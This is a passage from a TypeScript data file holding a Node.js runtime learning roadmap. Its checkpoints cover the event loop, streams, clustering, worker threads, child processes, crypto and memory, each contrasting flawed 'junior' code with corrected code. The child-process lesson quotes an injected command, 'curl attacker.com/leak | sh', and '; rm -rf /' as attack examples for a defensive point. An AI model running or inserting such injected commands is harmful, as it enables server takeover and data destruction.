import { SkillRoadmap } from './types';

export const nodejsRoadmap: SkillRoadmap = {
    skillId: 'nodejs',
    skillName: 'Node.js Runtime & Engine Essentials',
    category: 'SERVER-SIDE',
    tagline: 'Libuv event loop internals, V8 memory management, high-throughput streams, multi-core clustering, worker threads, and system architecture.',
    accentColor: '#16a34a',
    officialDocs: [
        {
            title: 'Node.js Official Documentation & API Reference',
            url: 'https://nodejs.org/docs/latest/api/',
            description: 'The authoritative reference manual for core Node.js runtime APIs (fs, stream, http, crypto, worker_threads, cluster).',
            badge: 'Official API Docs'
        },
        {
            title: 'Node.js Official Interactive Learning Course',
            url: 'https://nodejs.org/en/learn',
            description: 'Hands-on guided walkthroughs covering asynchronous architecture, package management, and web server foundations.',
            badge: 'Official Interactive Course'
        },
        {
            title: 'Node.js Event Loop Guide & Timers',
            url: 'https://nodejs.org/en/learn/asynchronous-work/event-loop-timers-and-nexttick',
            description: 'The definitive architectural deep dive on Libuv event loop phases, microtask queues, and process.nextTick mechanics.',
            badge: 'Architecture Guide'
        }
    ],
    checkpoints: [
        {
            id: 'node-1',
            title: 'Event Loop Phases & Microtask Priority (nextTick vs Promises)',
            estMinutes: 5,
            concept: {
                summary: 'Node.js executes JavaScript on a single thread using the Libuv event loop, structured in discrete phases: Timers (setTimeout), Pending Callbacks (I/O errors), Poll (incoming I/O requests), Check (setImmediate), and Close Callbacks. Microtasks (process.nextTick and Promise.then) are not distinct phases—they drain immediately after the current operation finishes, BEFORE the event loop advances to the next phase.',
                analogy: 'An emergency room triage: general waiting room patients (timers and I/O callbacks) wait for their turn in rounds, but urgent code-red cases (process.nextTick and microtasks) interrupt the physician immediately between patient consultations.',
                seniorInsight: 'Recursive calls to process.nextTick() completely starve the event loop by preventing the poll phase from ever running, freezing all incoming network traffic and file I/O.'
            },
            trap: {
                title: 'Assuming setTimeout(fn, 0) runs before Promise callbacks or setImmediate',
                juniorCode: `// ❌ JUNIOR: Expects setTimeout(0) to run first because it is registered first
setTimeout(() => console.log('1: Timeout 0'), 0);
setImmediate(() => console.log('2: Immediate'));
Promise.resolve().then(() => console.log('3: Promise'));
process.nextTick(() => console.log('4: NextTick'));
console.log('5: Sync');
// Output: 5 -> 4 -> 3 -> 1 (or 2 depending on process startup jitter)`,
                seniorCode: `// ✅ SENIOR: Understands exact queue priority and phase semantics
// 1. Synchronous call stack drains (5: Sync)
// 2. NextTick queue drains immediately (4: NextTick)
// 3. Other microtasks (Promises) drain (3: Promise)
// 4. In an I/O callback cycle, setImmediate ALWAYS executes before setTimeout(0)
import fs from 'node:fs';

fs.readFile('package.json', () => {
    setTimeout(() => console.log('Timer phase'), 0);
    setImmediate(() => console.log('Check phase: ALWAYS RUNS FIRST HERE'));
});`,
                explanation: 'Inside any I/O cycle (like fs or network), the poll phase is active. The very next phase in the loop is Check (setImmediate), guaranteeing setImmediate runs before Timers (setTimeout).'
            },
            drill: {
                question: 'What is the exact console output order of the following script?',
                starterCode: `console.log('A');
setTimeout(() => console.log('B'), 0);
process.nextTick(() => console.log('C'));
queueMicrotask(() => console.log('D'));
console.log('E');`,
                hint: 'Remember that process.nextTick queue is evaluated before the standard microtask queue.',
                solution: `Output:
A
E
C
D
B`,
                explanation: 'A and E run synchronously. process.nextTick (C) drains first among microtasks, followed by queueMicrotask/Promises (D). Finally, the macrotask timer queue executes (B).'
            },
            docLink: {
                title: 'Node.js Guide: Event Loop, Timers, and process.nextTick',
                url: 'https://nodejs.org/en/learn/asynchronous-work/event-loop-timers-and-nexttick',
                description: 'Comprehensive explanation of Libuv event loop phases, microtask queues, and starvation avoidance.'
            }
        },
        {
            id: 'node-2',
            title: 'Streams, Buffers & Backpressure (pipeline vs .pipe)',
            estMinutes: 5,
            concept: {
                summary: 'Streams process data sequentially in small chunks (~64KB buffers) rather than loading entire payloads into memory. Backpressure is the feedback mechanism triggered when a Writable stream cannot consume data as fast as the Readable stream emits it. If backpressure is ignored, unwritten chunks accumulate in RAM until the process crashes with Out of Memory.',
                analogy: 'Water flowing through a funnel: if you pour faster than the spout drains, the funnel overflows. Backpressure signals the pitcher to stop pouring until the spout clears.',
                seniorInsight: 'Never use stream.pipe() in modern production. It fails to destroy the source stream if the destination encounters an error or when a client disconnects prematurely, causing critical file descriptor leaks.'
            },
            trap: {
                title: 'Using fs.readFile() or unsafe .pipe() for file processing',
                juniorCode: `// ❌ JUNIOR: Reading 1.5GB into RAM buffer or using raw .pipe
import fs from 'node:fs';

async function exportData(req, res) {
    // 💥 Allocates entire 1.5GB file in Node memory; crashes under traffic!
    const file = await fs.promises.readFile('./large-export.csv');
    res.end(file);
}`,
                seniorCode: `// ✅ SENIOR: Uses stream.pipeline() with automatic backpressure and error teardown
import { pipeline } from 'node:stream/promises';
import { createReadStream } from 'node:fs';
import { createServer } from 'node:http';

const server = createServer(async (req, res) => {
    try {
        res.writeHead(200, {
            'Content-Type': 'text/csv',
            'Content-Disposition': 'attachment; filename="export.csv"'
        });
        const fileStream = createReadStream('./large-export.csv', { highWaterMark: 64 * 1024 });
        await pipeline(fileStream, res);
    } catch (err) {
        // pipeline() auto-destroys fileStream and frees file descriptors if res closes early
        if (!res.headersSent) res.writeHead(500);
        res.end('Stream error');
    }
});`,
                explanation: 'pipeline() from node:stream/promises automatically manages backpressure, forwards errors, and safely destroys all streams in the chain if a stream aborts.'
            },
            drill: {
                question: 'What return value from writable.write(chunk) signals that the producer must pause sending data?',
                hint: 'It returns a boolean indicating whether the internal buffer exceeded highWaterMark.',
                solution: `false signals backpressure.
When writable.write(chunk) returns false, the readable source must pause until the writable stream emits the 'drain' event:

if (!destination.write(chunk)) {
    source.pause();
    destination.once('drain', () => source.resume());
}`,
                explanation: 'A false return value indicates that the buffer is full. Pausing until drain prevents unbounded memory growth.'
            },
            docLink: {
                title: 'Node.js Documentation: stream.pipeline() API',
                url: 'https://nodejs.org/api/stream.html#streampipelinesource-transforms-destination-callback',
                description: 'Official API reference for pipeline composition, transform streams, and automatic cleanup.'
            }
        },
        {
            id: 'node-3',
            title: 'Multi-Core Scaling with Cluster Mode',
            estMinutes: 5,
            concept: {
                summary: 'By default, Node.js runs on a single CPU core. A machine with 16 cores leaves 15 cores completely idle unless multi-processing is enabled. The `node:cluster` module allows you to fork multiple independent OS child processes (workers) that all share the exact same server port. The master process distributes incoming network connections across worker processes using round-robin load balancing.',
                analogy: 'Opening a supermarket: running single-threaded is hiring 1 cashier with 15 checkout lanes sitting dark. Cluster mode is staffing all 16 checkout lanes simultaneously with a floor manager at the entrance directing shoppers to open lanes.',
                seniorInsight: 'Cluster workers do NOT share in-memory state. Global variables, in-memory caches, or in-memory session arrays are isolated to each worker process. Use Redis for shared state across cluster instances.'
            },
            trap: {
                title: 'Running a production Node server on single-thread or storing shared sessions in process memory',
                juniorCode: `// ❌ JUNIOR: Only utilizes 1 CPU core on an 8-core production server
import http from 'node:http';

const server = http.createServer((req, res) => res.end('OK'));
server.listen(3000); // 7 CPU cores remain at 0% utilization!`,
                seniorCode: `// ✅ SENIOR: Cluster master/worker supervisor with zero-downtime respawning
import cluster from 'node:cluster';
import http from 'node:http';
import os from 'node:os';

const numCPUs = os.cpus().length;

if (cluster.isPrimary) {
    console.log(\`Primary \${process.pid} is running. Forking \${numCPUs} workers...\`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    // Auto-respawn worker if it crashes:
    cluster.on('exit', (worker, code, signal) => {
        console.warn(\`Worker \${worker.process.pid} died (\${signal || code}). Respawning...\`);
        cluster.fork();
    });
} else {
    // Workers share the TCP connection:
    const server = http.createServer((req, res) => {
        res.writeHead(200);
        res.end(\`Handled by worker \${process.pid}\`);
    });
    server.listen(3000);
}`,
                explanation: 'Cluster mode maximizes hardware utilization by utilizing 100% of available CPU cores, providing resilience against process crashes through automatic worker replacement.'
            },
            drill: {
                question: 'How do cluster worker processes share the same listening TCP port (e.g. port 3000) without throwing EADDRINUSE?',
                hint: 'Does each worker bind the socket directly, or does the master process handle it?',
                solution: `The master process binds the listening socket and accepts new incoming connections.
When a new connection arrives, the master process passes the raw socket handle over internal IPC (Inter-Process Communication) to one of the child workers using a round-robin algorithm.`,
                explanation: 'Libuv master process handles the OS socket binding and delegates handles to workers.'
            },
            docLink: {
                title: 'Node.js Documentation: Cluster Module',
                url: 'https://nodejs.org/api/cluster.html',
                description: 'Official guide on cluster setup, worker events, and process distribution.'
            }
        },
        {
            id: 'node-4',
            title: 'Worker Threads for CPU-Bound Offloading',
            estMinutes: 5,
            concept: {
                summary: 'While Cluster creates separate OS processes with isolated memory, `node:worker_threads` runs multiple threads inside the SAME process sharing memory via ArrayBuffers. When an operation requires heavy synchronous CPU computation (cryptographic key generation, image resizing, complex math, PDF compilation), executing it on the main thread freezes the event loop. Worker Threads offload CPU work, keeping the event loop responsive.',
                analogy: 'Cluster is opening 8 identical bank branches with separate staff (separate memory). Worker Threads is one branch with 8 clerks sharing the same physical vault and customer files (shared memory).',
                seniorInsight: 'Use Cluster mode for horizontal web traffic load balancing across CPU cores; use Worker Threads specifically for offloading heavy, CPU-bound calculation jobs from the main event loop.'
            },
            trap: {
                title: 'Executing CPU-heavy operations synchronously on the main event loop',
                juniorCode: `// ❌ JUNIOR: Freezes entire Node.js server for all users during execution
function calculateHeavyPrimes(req, res) {
    // 5-second blocking synchronous calculation:
    let sum = 0;
    for (let i = 0; i < 1e10; i++) { sum += i; } // 💥 Freezes ALL concurrent HTTP traffic!
    res.end(JSON.stringify({ result: sum }));
}`,
                seniorCode: `// ✅ SENIOR: Offloads CPU-heavy task to a Worker Thread pool
import { Worker } from 'node:worker_threads';

export function runCalculationWorker(data: unknown): Promise<number> {
    return new Promise((resolve, reject) => {
        const worker = new Worker('./workers/computeWorker.js', { workerData: data });
        worker.on('message', resolve);
        worker.on('error', reject);
        worker.on('exit', (code) => {
            if (code !== 0) reject(new Error(\`Worker stopped with exit code \${code}\`));
        });
    });
}

// In HTTP handler: event loop never stalls
async function handleRequest(req, res) {
    const result = await runCalculationWorker(req.body);
    res.end(JSON.stringify({ result }));
}`,
                explanation: 'Offloading to a Worker thread runs the computation on a separate OS thread, leaving the main thread event loop responsive to incoming HTTP requests without any latency penalty.'
            },
            drill: {
                question: 'How do parent threads and worker threads communicate in Node.js?',
                hint: 'Think about MessagePort events and transferable objects.',
                solution: `Using message passing via parentPort:

// In main thread:
worker.postMessage({ task: 'calculate' });
worker.on('message', (result) => console.log(result));

// In worker.js:
import { parentPort } from 'node:worker_threads';
parentPort?.on('message', (data) => {
    const result = heavyWork(data);
    parentPort?.postMessage(result);
});`,
                explanation: 'Worker threads communicate through serialized message channels, or through zero-copy SharedArrayBuffer and Transferable objects.'
            },
            docLink: {
                title: 'Node.js Documentation: worker_threads Module',
                url: 'https://nodejs.org/api/worker_threads.html',
                description: 'Official guide on spawning parallel threads, MessageChannel, and SharedArrayBuffer.'
            }
        },
        {
            id: 'node-5',
            title: 'Child Processes & OS Execution (spawn vs exec)',
            estMinutes: 5,
            concept: {
                summary: 'The `node:child_process` module allows Node.js to execute operating system commands and external binaries (e.g. ffmpeg, git, tar). The two primary methods are `exec` (which spawns a shell and buffers the entire output in memory with a default 1MB maxBuffer limit) and `spawn` (which executes the binary directly without a shell, streaming stdout and stderr in real-time).',
                analogy: 'Running an external program: `exec` is ordering a 500-page report printed, bound, and delivered to your desk in one box (crashes if the report is too big); `spawn` is reading pages one by one as they come off the printing press in real time.',
                seniorInsight: 'Never pass untrusted user input into `exec()` or `execSync()` because it spawns a system shell (`/bin/sh` or `cmd.exe`), making Command Injection trivial via string concatenation (e.g. `; rm -rf /`). Always use `spawn(command, [args])`.'
            },
            trap: {
                title: 'Using exec() with user input or exceeding maxBuffer limits',
                juniorCode: `// ❌ JUNIOR: Catastrophic Command Injection vulnerability + maxBuffer crash
import { exec } from 'node:child_process';

function convertVideo(userInputFilename) {
    // Attacker sends: "video.mp4; curl attacker.com/leak | sh"
    exec(\`ffmpeg -i \${userInputFilename} output.mp4\`, (err, stdout) => {
        // 💥 Attacker gained full shell access to server!
        // 💥 Also crashes if stdout output exceeds 1MB buffer limit!
    });
}`,
                seniorCode: `// ✅ SENIOR: spawn() with arguments array (no shell interpolation) and streaming output
import { spawn } from 'node:child_process';

export function convertVideoSafe(safeFilename: string): Promise<void> {
    return new Promise((resolve, reject) => {
        // spawn() invokes the binary directly; arguments array cannot be shell-injected:
        const child = spawn('ffmpeg', ['-i', safeFilename, 'output.mp4']);

        // Stream output in real time without buffer limits:
        child.stdout.on('data', (chunk) => console.log(\`ffmpeg: \${chunk}\`));
        child.stderr.on('data', (errChunk) => console.warn(\`ffmpeg stderr: \${errChunk}\`));

        child.on('close', (code) => {
            if (code === 0) resolve();
            else reject(new Error(\`ffmpeg process exited with code \${code}\`));
        });
    });
}`,
                explanation: 'Using spawn with an array of arguments completely eliminates shell injection vectors because the OS kernel receives discrete argument strings rather than evaluating shell commands.'
            },
            drill: {
                question: 'What is the primary difference between `spawn` and `fork` in `node:child_process`?',
                hint: 'What type of executable does fork specifically target?',
                solution: `spawn() executes any arbitrary system executable (e.g. Python, bash, ffmpeg, git).
fork() is a specialized instance of spawn() designed specifically to spawn fresh Node.js processes. It automatically sets up a built-in IPC (Inter-Process Communication) channel, enabling process.send() and process.on('message') between parent and child Node processes.`,
                explanation: 'fork() streamlines Node-to-Node process execution and message passing.'
            },
            docLink: {
                title: 'Node.js Documentation: Child Process Module',
                url: 'https://nodejs.org/api/child_process.html',
                description: 'Official guide on spawn, exec, fork, and IPC communication channels.'
            }
        },
        {
            id: 'node-6',
            title: 'Native HTTP/HTTPS Server & Raw Sockets',
            estMinutes: 5,
            concept: {
                summary: 'Before frameworks like Express, Node.js core includes the `node:http` and `node:https` modules. An IncomingMessage is a Readable stream representing the HTTP request headers and payload chunks. The ServerResponse is a Writable stream. Understanding raw HTTP empowers developers to build custom gateways, reverse proxies, and WebSocket upgrade listeners without framework overhead.',
                analogy: 'Driving a manual transmission car: higher-level frameworks are automatic transmissions with cruise control; understanding native `node:http` is knowing how the clutch, gears, and engine timing actually connect to the wheels.',
                seniorInsight: 'WebSockets work by hijacking the underlying TCP socket during the HTTP handshake: the server listens for the `upgrade` event on the HTTP server, validates the Sec-WebSocket-Key, returns HTTP 101 Switching Protocols, and claims the raw TCP stream.'
            },
            trap: {
                title: 'Attempting to read req.body synchronously or forgetting to end the response stream',
                juniorCode: `// ❌ JUNIOR: Expects req.body to exist on raw Node.js HTTP server
import http from 'node:http';

http.createServer((req, res) => {
    console.log(req.body); // 💥 undefined! Native Node requires reading chunks from stream!
    res.write('Hello'); // Forgets res.end(); client waits forever!
}).listen(3000);`,
                seniorCode: `// ✅ SENIOR: Reads raw request stream buffers with body size limits
import http from 'node:http';

const MAX_BODY_SIZE = 1024 * 1024; // 1MB limit

const server = http.createServer(async (req, res) => {
    if (req.method === 'POST') {
        const chunks: Buffer[] = [];
        let totalSize = 0;

        req.on('data', (chunk: Buffer) => {
            totalSize += chunk.length;
            if (totalSize > MAX_BODY_SIZE) {
                res.writeHead(413, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Payload Too Large' }));
                req.destroy(); // Terminate connection
                return;
            }
            chunks.push(chunk);
        });

        req.on('end', () => {
            const rawBody = Buffer.concat(chunks).toString('utf8');
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ receivedLength: rawBody.length }));
        });
    } else {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('Server ready');
    }
});`,
                explanation: 'In native Node.js, request bodies are streams of Buffer chunks. You must collect chunks, enforce max size limits to prevent memory exhaustion, and always call res.end().'
            },
            drill: {
                question: 'How does a Node.js HTTP server intercept and handle WebSocket upgrade requests?',
                hint: 'Which event is emitted on the http.Server when a client sends `Connection: Upgrade`?',
                solution: `By listening to the 'upgrade' event on the http.Server:

server.on('upgrade', (req, socket, head) => {
    // Validate authentication or headers:
    if (req.headers['upgrade'] !== 'websocket') {
        socket.destroy();
        return;
    }
    // Hand over the raw TCP socket to WebSocket server (e.g. ws.handleUpgrade)
    wss.handleUpgrade(req, socket, head, (ws) => {
        wss.emit('connection', ws, req);
    });
});`,
                explanation: 'The upgrade event provides the underlying TCP socket directly, allowing protocol switching.'
            },
            docLink: {
                title: 'Node.js Documentation: HTTP Module',
                url: 'https://nodejs.org/api/http.html',
                description: 'Official API reference for http.createServer, IncomingMessage, and ServerResponse.'
            }
        },
        {
            id: 'node-7',
            title: 'File System Operations & Atomic Writes (node:fs/promises)',
            estMinutes: 5,
            concept: {
                summary: 'The `node:fs/promises` module provides non-blocking asynchronous file operations. When writing critical configuration or data files, writing directly to the target file can result in a corrupted, half-written file if the Node process crashes or power drops mid-write. Senior engineers use the Atomic Write pattern: write data to a temporary file in the same filesystem, and then call `fs.rename()`, which is an atomic filesystem operation.',
                analogy: 'Swapping paintings in a museum: rather than taking down the old painting and leaving an empty frame on the wall while you paint the new one, you paint the new canvas completely in your studio (temp file), then swap it into the frame in one instant motion (atomic rename).',
                seniorInsight: '`fs.rename()` is only atomic if the temporary file and destination file reside on the exact same physical disk partition/mount point. Moving across mount points falls back to a slow copy-and-delete.'
            },
            trap: {
                title: 'Writing critical files directly or using synchronous fs methods in server routes',
                juniorCode: `// ❌ JUNIOR: Freezes the entire event loop or risks corrupted partial files
import fs from 'node:fs';

function updateConfig(newConfig) {
    // 💥 fs.writeFileSync blocks all concurrent network traffic!
    // 💥 If server crashes during write, config.json is corrupted and unparseable!
    fs.writeFileSync('./config.json', JSON.stringify(newConfig));
}`,
                seniorCode: `// ✅ SENIOR: Atomic file write with temporary file replacement and crypto randomness
import fs from 'node:fs/promises';
import path from 'node:path';
import crypto from 'node:crypto';

export async function writeAtomic(filePath: string, data: string): Promise<void> {
    const dir = path.dirname(filePath);
    const tempPath = path.join(dir, \`.\${path.basename(filePath)}.\${crypto.randomUUID()}.tmp\`);

    // 1. Write entire payload to hidden temporary file
    await fs.writeFile(tempPath, data, 'utf8');

    // 2. Atomically swap temp file with target file (O(1) kernel operation)
    await fs.rename(tempPath, filePath);
}`,
                explanation: 'fs.rename() replaces the target file atomically at the OS inode level. If a crash occurs at any moment, the original file remains 100% intact.'
            },
            drill: {
                question: 'Why should you prefer `fs.opendir()` over `fs.readdir()` when reading a directory containing 500,000 files?',
                hint: 'Consider memory allocation for the resulting file list.',
                solution: `fs.readdir() loads all 500,000 filenames into an in-memory JavaScript array simultaneously, causing an immediate multi-megabyte RAM spike.
fs.opendir() returns an asynchronous iterable Dir stream, yielding Dirent objects one by one as they are read from the filesystem without buffering the entire list in memory.`,
                explanation: 'opendir() scales to millions of directory files without memory exhaustion.'
            },
            docLink: {
                title: 'Node.js Documentation: File System Module',
                url: 'https://nodejs.org/api/fs.html',
                description: 'Official API documentation for async file descriptors, streams, and directories.'
            }
        },
        {
            id: 'node-8',
            title: 'Process Lifecycle & Graceful Shutdown (SIGTERM / SIGINT)',
            estMinutes: 5,
            concept: {
                summary: 'When a container orchestrator (Kubernetes, AWS ECS, Docker) scales down or redeploys a container, it sends a POSIX SIGTERM signal. A resilient Node application intercepts SIGTERM, stops accepting new HTTP connections, waits for in-flight requests to complete, flushes logs, closes database pools cleanly, and exits with code 0 before the hard SIGKILL timeout is reached.',
                analogy: 'Closing a restaurant for the night: the host locks the front door to new customers (stops accepting connections), but allows seated diners to finish eating their meals (in-flight requests) before turning off the kitchen stoves and locking up.',
                seniorInsight: 'Always track active keep-alive HTTP sockets with `server.closeIdleConnections()` or connection managers, otherwise idle long-lived browser keep-alive sockets will keep your process alive until Kubernetes forcefully kills it with SIGKILL.'
            },
            trap: {
                title: 'Ignoring process lifecycle signals or abruptly terminating with process.exit()',
                juniorCode: `// ❌ JUNIOR: Database transactions cut mid-flight, corrupting client orders
process.on('SIGTERM', () => {
    console.log('Received SIGTERM, killing process now');
    process.exit(0); // Cuts off all active customer payments mid-execution!
});`,
                seniorCode: `// ✅ SENIOR: Graceful shutdown with connection draining and database pool teardown
import http from 'node:http';

const server = http.createServer((req, res) => res.end('OK'));
server.listen(3000);

const shutdown = async (signal: string) => {
    console.log(\`Received \${signal}. Starting graceful shutdown...\`);
    
    // 1. Stop accepting new incoming requests
    server.close(async (err) => {
        if (err) {
            console.error('Error closing HTTP server:', err);
            process.exit(1);
        }

        try {
            // 2. Close database connection pool & flush resources:
            console.log('Closing database pools...');
            // await db.$disconnect();

            console.log('Graceful shutdown completed successfully.');
            process.exit(0);
        } catch (cleanupErr) {
            console.error('Error during cleanup:', cleanupErr);
            process.exit(1);
        }
    });

    // 3. Close idle keep-alive connections immediately:
    server.closeIdleConnections();

    // 4. Force termination if in-flight requests take longer than 25 seconds:
    setTimeout(() => {
        console.error('Forcefully terminating: graceful shutdown timed out.');
        process.exit(1);
    }, 25000).unref(); // unref prevents timeout from keeping event loop alive
};

process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));`,
                explanation: 'A graceful shutdown sequence prevents transaction corruption, preserves audit trails, and guarantees zero 502 Bad Gateway errors during zero-downtime rolling deployments.'
            },
            drill: {
                question: 'Why is `.unref()` called on the fallback timeout timer during the graceful shutdown sequence?',
                hint: 'What stops a Node.js process from exiting naturally when timers are active?',
                solution: `In Node.js, an active timer keeps the event loop alive by default.
If server.close() and database connections finish closing within 2 seconds, but the fallback timeout is set for 25 seconds, the process would hang and wait for the remaining 23 seconds before finally exiting.
Calling .unref() tells the Node runtime that this timer should NOT prevent the process from exiting if all other work has completed.`,
                explanation: 'unref() ensures fallback fail-safe timers do not artificially delay prompt process termination.'
            },
            docLink: {
                title: 'Node.js Production Practices: Process Termination',
                url: 'https://nodejs.org/api/process.html#signal-events',
                description: 'Official API documentation on POSIX signal events and exit code conventions.'
            }
        },
        {
            id: 'node-9',
            title: 'Node Core Cryptography & Constant-Time Security',
            estMinutes: 5,
            concept: {
                summary: 'The `node:crypto` module provides native bindings to OpenSSL for high-speed cryptographic operations. Key capabilities include: cryptographically secure random UUIDs (`crypto.randomUUID()`), password hashing, symmetric authenticated encryption (`aes-256-gcm`), and constant-time string comparisons (`crypto.timingSafeEqual`) to protect authentication tokens and webhooks against timing-based side-channel attacks.',
                analogy: 'Securing a bank branch vault: opening the vault with a mechanical combination lock that ticks at a constant pace regardless of whether digits are right or wrong (constant-time comparison), and sealing bags with numbered tamper-evident wire tags (authenticated encryption).',
                seniorInsight: 'Standard string comparisons (tokenA === tokenB) return false immediately upon the first non-matching character, allowing attackers to measure execution time differences down to nanoseconds to deduce valid tokens character-by-character.'
            },
            trap: {
                title: 'Using Math.random() for security tokens or standard === for webhook verification',
                juniorCode: `// ❌ JUNIOR: Predictable random tokens and timing attack vulnerability
const token = Math.random().toString(36).substring(2); // Math.random is NOT cryptographically secure!

function verifyWebhook(signature, expected) {
    return signature === expected; // 💥 Leaks timing information character-by-character!
}`,
                seniorCode: `// ✅ SENIOR: Cryptographically secure random tokens and constant-time comparison
import crypto from 'node:crypto';

// 1. Cryptographically secure tokens
export function generateSecureToken(): string {
    return crypto.randomBytes(32).toString('hex');
}

// 2. Constant-time comparison for HMAC signatures
export function verifySignature(signature: string, expected: string): boolean {
    const sigBuffer = Buffer.from(signature, 'utf8');
    const expectedBuffer = Buffer.from(expected, 'utf8');
    if (sigBuffer.length !== expectedBuffer.length) return false;
    return crypto.timingSafeEqual(sigBuffer, expectedBuffer);
}

// 3. Authenticated AES-256-GCM symmetric encryption
export function encryptData(text: string, key32Bytes: Buffer): { cipherText: string; iv: string; tag: string } {
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', key32Bytes, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const tag = cipher.getAuthTag().toString('hex');
    return { cipherText: encrypted, iv: iv.toString('hex'), tag };
}`,
                explanation: 'crypto.timingSafeEqual executes in constant time regardless of where mismatches occur, completely eliminating timing leakage on HMAC and API key verifications.'
            },
            drill: {
                question: 'Why does AES-256-GCM require an Authentication Tag (auth tag) in addition to the encrypted ciphertext and IV?',
                hint: 'What guarantees that the encrypted ciphertext was not tampered with in transit?',
                solution: `AES-256-GCM is an Authenticated Encryption with Associated Data (AEAD) algorithm.
The Authentication Tag acts as a cryptographic checksum of both the ciphertext and integrity metadata.
If an attacker modifies even a single bit of the encrypted payload in transit or database, decipher.final() will detect the signature mismatch and throw an authentication error, preventing tampering attacks.`,
                explanation: 'AEAD ciphers guarantee both confidentiality and cryptographic integrity.'
            },
            docLink: {
                title: 'Node.js Documentation: Crypto Module',
                url: 'https://nodejs.org/api/crypto.html',
                description: 'Official API documentation for hashing, ciphers, and timing-safe operations.'
            }
        },
        {
            id: 'node-10',
            title: 'Asynchronous Context Tracing (AsyncLocalStorage)',
            estMinutes: 5,
            concept: {
                summary: 'In multi-tiered server architectures (Controllers -> Services -> Repositories -> Audit Loggers), passing user sessions or tenant IDs as function arguments through every single layer creates excessive prop-drilling. Node.js provides `AsyncLocalStorage` (part of `node:async_hooks`), allowing you to store asynchronous thread-local context that automatically persists across promise chains and callbacks.',
                analogy: 'A guest conference lanyard: when you step into the venue (HTTP request), you are handed a visitor badge (AsyncLocalStorage context). Every room you enter (database query, internal service) can verify who you are without you having to announce your name to every clerk along the hallway.',
                seniorInsight: 'Use AsyncLocalStorage in database middleware to automatically inject the current organizationId into every single query without manually writing where: { organizationId } in every repository call.'
            },
            trap: {
                title: 'Using module-level variables for request context in an asynchronous environment',
                juniorCode: `// ❌ JUNIOR: Catastrophic race condition across concurrent HTTP requests!
let currentTenantId: string; // Global variable!

async function handleRequest(req, res) {
    currentTenantId = req.headers['x-tenant-id']; // Request B overwrites Request A!
    await someDbCall(); // While awaiting, Request B arrives!
    await auditLog(currentTenantId); // 💥 Logs under wrong tenant!
}`,
                seniorCode: `// ✅ SENIOR: Thread-local asynchronous storage via AsyncLocalStorage
import { AsyncLocalStorage } from 'node:async_hooks';
import http from 'node:http';

interface RequestContext {
    userId: string;
    tenantId: string;
    correlationId: string;
}

export const requestContext = new AsyncLocalStorage<RequestContext>();

const server = http.createServer((req, res) => {
    const context: RequestContext = {
        userId: (req.headers['x-user-id'] as string) || 'anonymous',
        tenantId: (req.headers['x-tenant-id'] as string) || 'default',
        correlationId: (req.headers['x-request-id'] as string) || crypto.randomUUID()
    };

    // All async code inside this run callback maintains isolated access:
    requestContext.run(context, async () => {
        await processBusinessLogic();
        res.writeHead(200);
        res.end('Processed');
    });
});

async function processBusinessLogic() {
    const ctx = requestContext.getStore();
    console.log(\`Processing order for tenant \${ctx?.tenantId}\`);
}`,
                explanation: 'AsyncLocalStorage is completely safe under high concurrent traffic. Node.js preserves storage isolation across async/await boundaries, promises, and event emitters.'
            },
            drill: {
                question: 'Why does setting a module-level variable let currentTenant = req.tenant fail in Node.js asynchronous applications?',
                hint: 'How does Node.js handle concurrent requests on its single main thread?',
                solution: `Because Node.js runs on a single event loop handling hundreds of concurrent requests simultaneously.
If Request 1 sets currentTenant = 'Company A' and hits an await db.query() statement:
While Request 1 waits for the database, Request 2 arrives and sets currentTenant = 'Company B'.
When Request 1 resumes, currentTenant is now 'Company B'—causing Request 1 to execute its remaining logic using another tenant's credentials.
AsyncLocalStorage solves this by binding the storage directly to the execution context of the asynchronous promise chain.`,
                explanation: 'Never use module-level mutable variables for request-scoped state in Node.js.'
            },
            docLink: {
                title: 'Node.js Documentation: AsyncLocalStorage API',
                url: 'https://nodejs.org/api/async_context.html#class-asynclocalstorage',
                description: 'Official guide on asynchronous context tracking, run(), and getStore().'
            }
        },
        {
            id: 'node-11',
            title: 'V8 Memory Management, Garbage Collection & Leaks',
            estMinutes: 5,
            concept: {
                summary: 'Node.js memory is managed by the V8 engine, divided into Heap (New Space for short-lived objects using the fast Scavenge garbage collector; Old Space for persistent objects using Mark-Sweep-Compact) and Off-Heap Buffer memory. Memory leaks occur when event listeners are never removed, global variables accumulate objects indefinitely, or closures retain unused references.',
                analogy: 'A kitchen waste system: vegetable peels and napkins go into the quick daily compost bin (New Space Scavenge); sturdy storage jars and cookware are kept on the permanent pantry shelves (Old Space). A leak is hoarding empty cardboard boxes in the hallway until you cannot open the front door.',
                seniorInsight: 'Never allocate large buffers with `Buffer.allocUnsafe(size)` without immediately writing over them. allocUnsafe returns uninitialized memory chunks that may contain sensitive leftover data from previous process operations.'
            },
            trap: {
                title: 'Adding event listeners inside request handlers without removing them, creating memory leaks',
                juniorCode: `// ❌ JUNIOR: EventEmitter listener leak; memory grows until process crashes
import EventEmitter from 'node:eventemitter3';
const globalEmitter = new EventEmitter();

function handleUserRequest(req, res) {
    // 💥 Every request adds a NEW listener to globalEmitter that is NEVER cleaned up!
    globalEmitter.on('broadcast', (data) => {
        res.write(JSON.stringify(data));
    });
}`,
                seniorCode: `// ✅ SENIOR: Cleans up listeners on connection close & diagnoses heap statistics
import v8 from 'node:v8';

function handleUserRequest(req, res) {
    const onBroadcast = (data: unknown) => {
        if (!res.writableEnded) res.write(JSON.stringify(data));
    };

    globalEmitter.on('broadcast', onBroadcast);

    // Clean up when client disconnects:
    res.on('close', () => {
        globalEmitter.off('broadcast', onBroadcast);
    });
}

// Log V8 memory metrics in monitoring:
export function checkMemoryUsage() {
    const stats = v8.getHeapStatistics();
    const usedMb = stats.used_heap_size / 1024 / 1024;
    const totalMb = stats.total_heap_size / 1024 / 1024;
    console.log(\`V8 Heap: \${usedMb.toFixed(2)}MB / \${totalMb.toFixed(2)}MB\`);
}`,
                explanation: 'Removing event listeners on connection close prevents closure references from staying pinned in V8 Old Space memory.'
            },
            drill: {
                question: 'What is the security difference between `Buffer.alloc(size)` and `Buffer.allocUnsafe(size)`?',
